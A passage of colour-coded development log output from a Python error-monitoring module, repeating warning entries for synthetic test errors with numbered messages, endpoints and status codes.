WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735771Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 938'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735821Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 939'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735870Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 940'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735919Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 941'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.735968Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 942'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736016Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 943'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736064Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 944'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736112Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 945'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736160Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 946'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736208Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 947'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736256Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 948'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736305Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m19[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 949'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736354Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 950'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736453Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 951'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736525Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 952'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736607Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 953'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736689Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 954'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736748Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 955'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736801Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 956'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736852Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 957'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736902Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 958'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.736952Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 959'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737002Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 960'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737053Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 961'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737107Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 962'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737159Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 963'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737210Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 964'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737260Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 965'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737311Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 966'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737360Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 967'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737410Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 968'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737459Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 969'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737507Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 970'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737557Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 971'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737607Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 972'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737659Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 973'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737709Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 974'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737757Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 975'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737806Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 976'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.737854Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m20[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 977'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
